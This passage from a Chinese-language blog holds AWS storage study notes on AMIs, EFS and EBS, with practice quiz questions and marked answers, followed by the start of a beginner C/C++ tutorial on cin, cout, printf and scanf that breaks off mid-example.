<li>可以使用AWS創建的AMI</li>
<li>自訂義自己的AMI<ul>
<li>自己的軟體配置</li>
<li>定義和設置操作系統</li>
<li>設定監控工具</li>
<li>獲得更快的啟動時間和配置時間</li>
</ul>
</li>
<li>針對特定區域構建<ul>
<li>可跨區域複製</li>
</ul>
</li>
<li>可從不同類型的AMI啟動EC2實例</li>
<li>可以從AWS Marketplace AMI啟動EC2實例<ul>
<li>由其他人創建的AMI</li>
<li>可能由其他人銷售</li>
<li>也可以自己在AWS市場上創建一個銷售AMI的業務</li>
</ul>
</li>
<li>AMI Process<ul>
<li>啟動一個EC2實例並對其自訂義</li>
<li>停止實例確保數據完整性正確</li>
<li>根據實例構建AMI，這樣還可以在後台創建EBS快照</li>
<li>從其他AMI啟動實例</li>
</ul>
</li>
</ul>
<h3 id="EFS-彈性文件系統-Elastic-File-System-Service"><a href="#EFS-彈性文件系統-Elastic-File-System-Service" class="headerlink" title="EFS 彈性文件系統 Elastic File System Service"></a>EFS 彈性文件系統 Elastic File System Service</h3><p><img src="img/EBS7.png" alt="Untitled"></p>
<ul>
<li>託管NFS (Network file system)</li>
<li>網路文件系統</li>
<li>可以掛載到許多EC2實例上<ul>
<li>EC2可以位於不同的可用性區域</li>
</ul>
</li>
<li>高度可用，可自動擴展，昂貴</li>
<li>按使用量付費<ul>
<li>用於EFS中的每GB數據</li>
</ul>
</li>
<li>不必提前配置容量</li>
<li>內容管理、web 服務、數據共享、Wordpress</li>
<li>內部使用NFSv4.1 協議</li>
<li>為了控制EFS的訪問，需要設置安全群組</li>
<li>只兼容基於Linux的AMI，而不是Windows</li>
<li>使用KMS在EFS驅動器中啟用靜態加密</li>
<li>它是Linux上的標準文件系統，因此使用POSIX系統，具有標準文件API</li>
<li>EFS規模<ul>
<li>可以獲得數千個併發NFS客戶端和10GB+/s吞吐量</li>
<li>自動擴展到PB級的網路文件系統</li>
</ul>
</li>
<li>創建EFS網路文件系統時設置<strong>性能模式</strong><ul>
<li>通用(默認)<ul>
<li>延遲敏感的用例(WEB server, CMS..)</li>
<li>最大化吞吐量<ul>
<li>最大的I/O</li>
<li>高延遲的網路文件系統</li>
<li>更高的吞吐量</li>
<li>高度並行</li>
<li>大數據應用程式或媒體處理需求</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>吞吐量模式</p>
<p>  <img src="img/EBS8.png" alt="Untitled"></p>
<ul>
<li>Bursting 爆裂<ul>
<li>一個TB，每秒50MiB 加上每秒100MiB</li>
</ul>
</li>
<li>Provisioned 資源調配<ul>
<li>無論存儲大小如何都要設置吞吐量</li>
<li>隨存儲容量的增加，前一個系統的吞吐量也在增長</li>
<li>通過配置可以為1TB的存儲容量提供每秒1GB的吞吐量</li>
</ul>
</li>
<li>Elsatic<ul>
<li>根據工作負載自動調整吞吐量</li>
<li>適合不可預測的工作負載</li>
</ul>
</li>
</ul>
</li>
<li><p>存儲類型</p>
<ul>
<li>生命週期管理功能</li>
<li>Standard : 允許在一定天數後將文件移動到不同的存儲層<ul>
<li>頻繁訪問的文件標準層</li>
</ul>
</li>
<li>Infrequent access (EFS-IA):<ul>
<li>可以檢索文件</li>
<li>存儲文件的成本低</li>
<li>不頻繁訪問的EFS-IA層</li>
</ul>
</li>
<li><p>Archive 歸檔存儲層:</p>
<p>  <img src="img/EBS9.png" alt="Untitled"></p>
<ul>
<li>針對很少訪問的數據</li>
<li>數據存儲在該層上的成本低，50% cheaper</li>
<li>要在存儲層之間自動移動文件，可以實施生命週期策略</li>
<li>允許定義文件在多少天後應移動到哪個層</li>
</ul>
</li>
</ul>
</li>
<li><p>可用性和持久性方面</p>
<ul>
<li>Standard<ul>
<li>當具有多個可用區設置</li>
<li>EFS跨多個可用區</li>
<li>生產工作負載非常有用</li>
</ul>
</li>
<li>One Zone<ul>
<li>只想進行開發並希望有更便宜的選擇</li>
<li>可以選擇一個區域，將提供一個可用性區域，仍然可以在其中進行備份，並與IA類型的存儲層兼容(EFS One Zone-IA)</li>
</ul>
</li>
</ul>
</li>
<li>通過使用正確的EFS存儲類型，可以節省高達90%的成本</li>
<li><p>EBS volumes</p>
<p>  <img src="img/EBS10.png" alt="Untitled"></p>
<ul>
<li>一次連接到一個實例<ul>
<li>除了使用io1和io2類型volumes的多連接功能邊緣情況外</li>
</ul>
</li>
<li>在AZ級別鎖定</li>
<li>gp2<ul>
<li>如果磁盤大小增加，IO將增加</li>
</ul>
</li>
<li>gp3 &amp; io1<ul>
<li>獨立於磁盤大小增加IO</li>
</ul>
</li>
<li>要跨AZ遷移EBS，需要拍快照<ul>
<li>將快照恢復到另一個AZ</li>
<li>EBS volumes備份，將使用大量IO，不應該在應用程式處理大量流量時運行他們，因為可能影響性能</li>
</ul>
</li>
<li>如果EC2被終止，實例的路由EBS volumes將默認被終止<ul>
<li>可以禁用該行為</li>
</ul>
</li>
</ul>
</li>
<li><p>EFS volumes</p>
<p>  <img src="img/EBS11.png" alt="Untitled"></p>
<ul>
<li>網路文件系統</li>
<li>目標是將其連接到可用性區域中的數百個實例</li>
<li>對於一個EFS，可以在不同的AZ中擁有不同的掛載目標</li>
<li>多個實例可以一起共享該文件系統</li>
<li>只適用Linux(POSIX)</li>
<li>EFS價位高於EBS，但可以利用存儲層節省成本</li>
<li>對於實例存儲，它是物理連接到EC2實例的，因此如果失去了EC2實例，你也會失去存儲</li>
</ul>
</li>
</ul>
<p><strong>You have just terminated an EC2 instance in <code>us-east-1a</code>, and its attached EBS volume is now available. Your teammate tries to attach it to an EC2 instance in <code>us-east-1b</code> but he can’t. What is a possible cause for this?</strong></p>
<ul>
<li>[ ]  • <strong>He’s missing IAM permissions</strong></li>
<li>[ ]  • <strong>EBS volumes are locked to an AWS Region</strong></li>
<li>[x]  • <strong>EBS volumes are locked to an Availability Zone</strong></li>
</ul>
<p><strong>You have launched an EC2 instance with two EBS volumes, Root volume type and the other EBS volume type to store the data. A month later you are planning to terminate the EC2 instance. What’s the default behavior that will happen to each EBS volume?</strong></p>
<ul>
<li>[ ]  • <strong>Both the root volume type and the EBS volume type will be deleted</strong></li>
<li>[x]  • <strong>The Root volume type will be deleted and the EBS volume type will not be deleted</strong></li>
<li>[ ]  • <strong>The root volume type will not be deleted and the EBS volume type will be deleted</strong></li>
<li>[ ]  • <strong>Both the root volume type and the EBS volume type will not be deleted</strong></li>
</ul>
<p><strong>You can use an AMI in N. Virginia Region <code>us-east-1</code> to launch an EC2 instance in any AWS Region.</strong></p>
<ul>
<li>[ ]  • <strong>True</strong></li>
<li>[x]  • <strong>False</strong></li>
</ul>
<blockquote>
<p>AMIs are built for a specific AWS Region, they’re unique for each AWS Region. You can’t launch an EC2 instance using an AMI in another AWS Region, but you can copy the AMI to the target AWS Region and then use it to create your EC2 instances.</p>
</blockquote>
<p><strong>Which of the following EBS volume types can be used as boot volumes when you create EC2 instances?</strong></p>
<ul>
<li>[ ]  • <strong><code>gp2</code>, <code>gp3</code>, <code>st1</code>, <code>sc1</code></strong></li>
<li>[x]  • <strong><code>gp2</code>, <code>gp3</code>, <code>io1</code>, <code>io2</code></strong></li>
<li>[ ]  • <strong><code>io1</code>, <code>io2</code>, <code>st1</code>, <code>sc1</code></strong></li>
</ul>
<p><strong>What is EBS Multi-Attach?</strong></p>
<ul>
<li>[ ]  • <strong>Attach the same EBS volume to multiple EC2 instances in multiple AZs</strong></li>
<li>[ ]  • <strong>Attach multiple EBS volumes in the same AZ to the same EC2 instance</strong></li>
<li>[x]  • <strong>Attach the same EBS volume to multiple EC2 instances in the same AZ</strong></li>
</ul>
<blockquote>
<p>Using EBS Multi-Attach, you can attach the same EBS volume to multiple EC2 instances in the same AZ. Each EC2 instance has full read/write permissions.</p>
<ul>
<li>[ ]  • <strong>Attach multiple EBS volumes in multiple AZs to the same EC2 instance</strong></li>
</ul>
</blockquote>
<p><strong>You would like to encrypt an unencrypted EBS volume attached to your EC2 instance. What should you do?</strong></p>
<ul>
<li>[x]  • <strong>Create an EBS snapshot of your EBS volume. Copy the snapshot and tick the option to encrypt the copied snapshot. Then, use the encrypted snapshot to create a new EBS volume</strong></li>
<li>[ ]  • <strong>Select your EBS volume, choose Edit Attributes, then tick the Encrypt using KMS option</strong></li>
<li>[ ]  • <strong>Create a new encrypted EBS volume, then copy data from your unencrypted EBS volume to the new EBS volume.</strong></li>
<li>[ ]  • <strong>Submit a request to AWS Support to encrypt your EBS volume</strong></li>
</ul>
<p><strong>You have a fleet of EC2 instances distributes across AZs that process a large data set. What do you recommend to make the same data to be accessible as an NFS drive to all of your EC2 instances?</strong></p>
<ul>
<li>[ ]  • <strong>Use EBS</strong></li>
<li>[x]  • <strong>Use EFS</strong></li>
<li>[ ]  • <strong>Use an Instance Store</strong></li>
</ul>
<p><strong>You would like to have a high-performance local cache for your application hosted on an EC2 instance. You don’t mind losing the cache upon the termination of your EC2 instance. Which storage mechanism do you recommend as a Solutions Architect?</strong></p>
<ul>
<li>[ ]  • <strong>EBS</strong></li>
<li>[ ]  • <strong>EFS</strong></li>
<li>[x]  • <strong>Instance Store</strong></li>
</ul>
<p><strong>You are running a high-performance database that requires an IOPS of 310,000 for its underlying storage. What do you recommend?</strong></p>
<ul>
<li>[ ]  • <strong>Use an EBS <code>gp2</code> drive</strong></li>
<li>[ ]  • <strong>Use an EBS <code>io1</code> drive</strong></li>
<li>[x]  • <strong>Use an EC2 Instance Store</strong></li>
</ul>
<blockquote>
<p>You can run a database on an EC2 instance that uses an Instance Store, but you’ll have a problem that the data will be lost if the EC2 instance is stopped (it can be restarted without problems). One solution is that you can set up a replication mechanism on another EC2 instance with an Instance Store to have a standby copy. Another solution is to set up backup mechanisms for your data. It’s all up to you how you want to set up your architecture to validate your requirements. In this use case, it’s around IOPS, so we have to choose an EC2 Instance Store.</p>
<ul>
<li>[ ]  • <strong>Use an EBS <code>io2</code> Block Express drive</strong></li>
</ul>
</blockquote>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>






  
    <article id="post-C_Cpp" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/12/21/C_Cpp/" class="article-date">
  	<time datetime="2024-12-21T12:32:07.080Z" itemprop="datePublished">2024-12-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/12/21/C_Cpp/">
        C And C++ Zero To Hero?
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="C-C-從入門到精通"><a href="#C-C-從入門到精通" class="headerlink" title="C/C++從入門到精通"></a>C/C++從入門到精通</h1><h1 id="程式入門須知"><a href="#程式入門須知" class="headerlink" title="程式入門須知"></a>程式入門須知</h1><h3 id="初學常犯der錯誤-grinning-face-with-one-large-and-one-small-eye"><a href="#初學常犯der錯誤-grinning-face-with-one-large-and-one-small-eye" class="headerlink" title="初學常犯der錯誤 :grinning_face_with_one_large_and_one_small_eye:"></a>初學常犯der錯誤 :grinning_face_with_one_large_and_one_small_eye:</h3><ul>
<li>常忘記在敘述行尾端打上<font color="#f11">分號(；)</font><blockquote>
<p>  cout &lt;&lt; “hi”</p>
</blockquote>
</li>
<li>在不應該出現分號的地方多打<blockquote>
<p>If(a = b);</p>
</blockquote>
</li>
<li>大小寫沒區分</li>
</ul>
<blockquote>
<p>C/C++語言規定大小寫字母是不同字元</p>
</blockquote>
<ul>
<li>拼錯字<blockquote>
<p>像是將char打成chr，如果錯誤訊息像是( ‘ )刮起來<font color="#f11">‘ chr ‘ was not declared in this score 字樣</font></p>
</blockquote>
</li>
<li>括弧未配成對<blockquote>
<p>有左括弧，就一定有右括弧(只要是括弧就一定是成對)</p>
</blockquote>
</li>
<li>引號未成對<blockquote>
<p>無論雙引號(用於字串)或單引號(用於字元)都要成對出現</p>
</blockquote>
</li>
<li>不該出現的空白符號<blockquote>
<p>像是namespace 打成name space 原本為連在一起的就不該隨意分開</p>
</blockquote>
</li>
</ul>
<h1 id="cin輸入"><a href="#cin輸入" class="headerlink" title="cin輸入"></a>cin輸入</h1><p><code>cin 物件可輸入文數字至指定的變數</code></p>
<ul>
<li><p><strong>可輸入字元至變數a</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> a;</span><br><span class="line">cin&gt;&gt;a;</span><br><span class="line">cout&lt;&lt;<span class="string">&quot;a&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>可輸入整數至變數b</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> b;</span><br><span class="line">cin&gt;&gt;b;</span><br><span class="line">cout&lt;&lt;<span class="string">&quot;b=&quot;</span>&lt;&lt;b&lt;&lt;endl;</span><br></pre></td></tr></table></figure></li>
<li><strong>可輸入字串至變數c</strong><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> c[<span class="number">5</span>];</span><br><span class="line">cin&gt;&gt;c;</span><br><span class="line">cout&lt;&lt;<span class="string">&quot;c=&quot;</span>&lt;&lt;c&lt;&lt;endl;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="cin-範例程式"><a href="#cin-範例程式" class="headerlink" title="cin 範例程式"></a>cin 範例程式</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">char</span> a; <span class="comment">//只輸出輸入的第一個字元EX:輸入106輸出1</span></span><br><span class="line">    cin&gt;&gt;a;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;a=&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">    <span class="type">int</span> b;<span class="comment">//只輸出整數若為0.2只輸出0</span></span><br><span class="line">    cin&gt;&gt;b;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;b=&quot;</span>&lt;&lt;b&lt;&lt;endl;</span><br><span class="line">    <span class="type">char</span> c[<span class="number">5</span>];<span class="comment">//可輸出多個字元EX:輸入106輸出106</span></span><br><span class="line">    cin&gt;&gt;c;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;c=&quot;</span>&lt;&lt;c&lt;&lt;endl;</span><br><span class="line">   <span class="comment">//下面這幾段也是同樣意思，可連續輸入3個變數EX:a 1 300 輸出a=a b=1 c=300 和前面一樣都可用連續輸入讓他輸出</span></span><br><span class="line">   cin&gt;&gt;a&gt;&gt;b&gt;&gt;c;</span><br><span class="line">   cout&lt;&lt;<span class="string">&quot;a=&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">   cout&lt;&lt;<span class="string">&quot;b=&quot;</span>&lt;&lt;b&lt;&lt;endl;</span><br><span class="line">   cout&lt;&lt;<span class="string">&quot;c=&quot;</span>&lt;&lt;c&lt;&lt;endl;  </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="cout-輸出"><a href="#cout-輸出" class="headerlink" title="cout 輸出"></a>cout 輸出</h1><p><code>cout可輸出指定任何文數字與變數內容，且不用管變數的資料型態</code><br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a=<span class="number">5</span>;</span><br><span class="line">cout&lt;&lt;a;</span><br><span class="line"><span class="comment">//輸出5</span></span><br></pre></td></tr></table></figure></p>
<h5 id="或是"><a href="#或是" class="headerlink" title="或是"></a>或是</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a=<span class="number">5</span>;</span><br><span class="line">cout&lt;&lt;<span class="string">&quot;a=&quot;</span>&lt;&lt;a;</span><br><span class="line"><span class="comment">//其中第一個用雙引號表示字串內容，以字串方式輸出，第二個a，則是變數，將會輸出對應變數的內容也是輸出5</span></span><br></pre></td></tr></table></figure>
<h3 id="cout-範例程式1"><a href="#cout-範例程式1" class="headerlink" title="cout 範例程式1"></a>cout 範例程式1</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Good&quot;</span> &lt;&lt;endl;</span><br><span class="line">    <span class="type">int</span> a =<span class="number">5</span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;a=&quot;</span> &lt;&lt;a&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="若要進行輸出資料的欄位寬度、符點小數位數、輸出靠左或靠右"><a href="#若要進行輸出資料的欄位寬度、符點小數位數、輸出靠左或靠右" class="headerlink" title="若要進行輸出資料的欄位寬度、符點小數位數、輸出靠左或靠右"></a>若要進行輸出資料的欄位寬度、符點小數位數、輸出靠左或靠右</h4><blockquote>
<h5 id="使用cout物件所提供的width、setf等屬性"><a href="#使用cout物件所提供的width、setf等屬性" class="headerlink" title="使用cout物件所提供的width、setf等屬性"></a>使用cout物件所提供的width、setf等屬性</h5></blockquote>
<h4 id="width屬性可設定輸出資料的欄位寬度，預設向右靠齊"><a href="#width屬性可設定輸出資料的欄位寬度，預設向右靠齊" class="headerlink" title="width屬性可設定輸出資料的欄位寬度，預設向右靠齊"></a>width屬性可設定輸出資料的欄位寬度，預設向右靠齊</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a1=<span class="number">1</span> ,a2=<span class="number">10</span> ,a3=<span class="number">100</span> ,a4=<span class="number">1000</span> ,a5=<span class="number">10000</span>;</span><br><span class="line">cout.<span class="built_in">width</span>(<span class="number">5</span>);cout&lt;&lt;a1&lt;&lt;endl;</span><br><span class="line">cout.<span class="built_in">width</span>(<span class="number">5</span>);cout&lt;&lt;a2&lt;&lt;endl;</span><br><span class="line">cout.<span class="built_in">width</span>(<span class="number">5</span>);cout&lt;&lt;a3&lt;&lt;endl;</span><br><span class="line">cout.<span class="built_in">width</span>(<span class="number">5</span>);cout&lt;&lt;a4&lt;&lt;endl;</span><br><span class="line">cout.<span class="built_in">width</span>(<span class="number">5</span>);cout&lt;&lt;a5&lt;&lt;endl;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>輸出結果會是<br>                   1<br>                  10<br>                 100<br>                1000<br>               10000[color=#d35]</p>
</blockquote>
<p>:::success<br>cout.width(5)<br><strong>在每個輸出前都要設定，有效期只有一次</strong><br>:::<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">cout.<span class="built_in">width</span>(<span class="number">5</span>)</span><br><span class="line">cout&lt;&lt; a1 &lt;&lt;endl;</span><br><span class="line">cout&lt;&lt; a2 &lt;&lt;endl;</span><br><span class="line"><span class="comment">//只對a1有效</span></span><br></pre></td></tr></table></figure></p>
<h3 id="範例程式2"><a href="#範例程式2" class="headerlink" title="範例程式2"></a>範例程式2</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> a1=<span class="number">100</span>,a2=<span class="number">100</span>;</span><br><span class="line">    cout.<span class="built_in">width</span>(<span class="number">5</span>);</span><br><span class="line">    cout &lt;&lt; a1 &lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; a2;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<pre><code>輸出會是
    100
  100
只會影響到第一個的輸出位置(預設靠右)
</code></pre><h4 id="setf可輸出資料的小數點位數，資料靠左或靠右"><a href="#setf可輸出資料的小數點位數，資料靠左或靠右" class="headerlink" title="setf可輸出資料的小數點位數，資料靠左或靠右"></a><strong>setf可輸出資料的小數點位數，資料靠左或靠右</strong></h4><ul>
<li><font color="#f11">cout.setf(ios::fixed,ios::floatfield);</font><h4 id="ios-gt-gt-命名空間名稱-quot-quot-gt-gt-範圍運算子-floatfield-gt-gt-表示浮點數欄位"><a href="#ios-gt-gt-命名空間名稱-quot-quot-gt-gt-範圍運算子-floatfield-gt-gt-表示浮點數欄位" class="headerlink" title="ios&gt;&gt;命名空間名稱__&quot;::&quot;&gt;&gt;範圍運算子__ floatfield &gt;&gt;表示浮點數欄位"></a><code>ios&gt;&gt;命名空間名稱__&quot;::&quot;&gt;&gt;範圍運算子__ floatfield &gt;&gt;表示浮點數欄位</code></h4></li>
<li><p><font color="#f11">cout.precision(2);</font></p>
<h5 id="precision-2-gt-gt-浮點數精準度-小數後取兩位"><a href="#precision-2-gt-gt-浮點數精準度-小數後取兩位" class="headerlink" title="precision(2)&gt;&gt;浮點數精準度(小數後取兩位)"></a><code>precision(2)&gt;&gt;浮點數精準度(小數後取兩位)</code></h5></li>
<li><p><font color="#f11">cout.setf(ios::right,ios::adjustfield)</font></p>
<h4 id="設定靠左-left-或靠右-right-，adjustfield-gt-gt-自動調整欄位"><a href="#設定靠左-left-或靠右-right-，adjustfield-gt-gt-自動調整欄位" class="headerlink" title="設定靠左(left)或靠右(right)，adjustfield &gt;&gt;自動調整欄位"></a><code>設定靠左(left)或靠右(right)，adjustfield &gt;&gt;自動調整欄位</code></h4></li>
</ul>
<h3 id="cout-範例程式3"><a href="#cout-範例程式3" class="headerlink" title="cout 範例程式3"></a>cout 範例程式3</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">  <span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line">  <span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">float</span> b1=<span class="number">3.14159</span>;</span><br><span class="line">    cout.<span class="built_in">setf</span>(ios::fixed,ios::floatfield);</span><br><span class="line">    cout.<span class="built_in">precision</span>(<span class="number">2</span>);</span><br><span class="line">    cout.<span class="built_in">setf</span>(ios::right,ios::adjustfield);</span><br><span class="line">    cout.<span class="built_in">width</span>(<span class="number">8</span>);</span><br><span class="line">    cout&lt;&lt;b1&lt;&lt;endl;</span><br><span class="line">    cout.<span class="built_in">width</span>(<span class="number">8</span>);</span><br><span class="line">    cout&lt;&lt;b1*<span class="number">20</span>&lt;&lt;endl;</span><br><span class="line">    cout.<span class="built_in">width</span>(<span class="number">8</span>);</span><br><span class="line">    cout&lt;&lt;b1*<span class="number">200</span>&lt;&lt;endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<pre><code>輸出結果
  3.14
 62.83
628.32
</code></pre><h1 id="printf-輸出"><a href="#printf-輸出" class="headerlink" title="printf 輸出"></a>printf 輸出</h1><p><code>C語言採用printf()與scanf()作為輸出入函式</code></p>
<font color="#f11">printf()</font>可輸出結果，期中括號內需放置一對<font color="#f11">大括號("")</font>達成將欲輸出的資料當作引數傳給printf()函式
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;a&quot;</span>); </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;aa&quot;</span>); </span><br></pre></td></tr></table></figure>
>輸出結果為  aaa

##### 要跳列的話，需使用到<font color="#f11">跳脫字元 \n</font>
`通常使用換行符\n，在其他情況下則使用控制符endl。一個差別是，endl確保程序將立即顯示在屏幕上；而使用“\n”不能提供這樣的保證，這意味著在有些系統中，有時可能在您輸入信息後才會出現提示。`
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;a\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;a\na&quot;</span>);  </span><br></pre></td></tr></table></figure>
>輸出結果
a
a
a 
### printf 範例程式1
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;a\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;a\nb\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

    結果就是  
    a
    a
    b 


#### 如果是變數的輸出，則必須在引數敘述中加一個列印格式控制輸出格式 

### printf 範例程式2
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> a=<span class="number">3</span>;</span><br><span class="line">	<span class="type">int</span> b=<span class="number">5</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;a=%d\nb=%d&quot;</span>,a,b);</span><br><span class="line"><span class="comment">// a,b會依序對應 </span></span><br><span class="line"><span class="comment">// %d&gt;&gt;整數 %ld&gt;&gt;長整數 %f&gt;&gt;浮點數  %c&gt;&gt;字元 %s&gt;&gt;字串(字元陣列)</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
    結果是 
    a=3
    b=5 

scanf 輸入
===

`scanf()可輸入資料，跟printf同樣方式，兩者都需用到列印格式控制輸出入資料`
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">輸入字元</span><br><span class="line"><span class="type">char</span> a;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%c,&amp;a&quot;</span>); </span><br><span class="line"><span class="comment">//%c&gt;&gt;字元 &amp;a&gt;&gt;指定到a，&amp;是取址符號用來取得欲放置輸入資料的變數位置</span></span><br></pre></td></tr></table></figure>
### scanf 範例程式1
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">char</span> a;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;press any char: &quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>, &amp;a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;char is %c&quot;</span>,a);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
     輸出結果>> 
     press any char: 1
     char is 1

#### C語言的字串是由<font color="#f11">字元陣列</font>組成
#### 在輸入字串時，必須利用字元陣列完成輸入

### scanf 範例程式2
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">char</span> c[<span class="number">6</span>]; <span class="comment">//一維陣列中有6個元素 </span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;enter a string: &quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;c); <span class="comment">//%s&gt;&gt;字元陣列 </span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;enter is %s&quot;</span>, c);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
>此程式輸入是什麼輸出就是什麼

### scanf 範例程式3
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> a;</span><br><span class="line">	<span class="type">long</span> b;</span><br><span class="line">	<span class="type">float</span> c;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;enter an int: &quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span 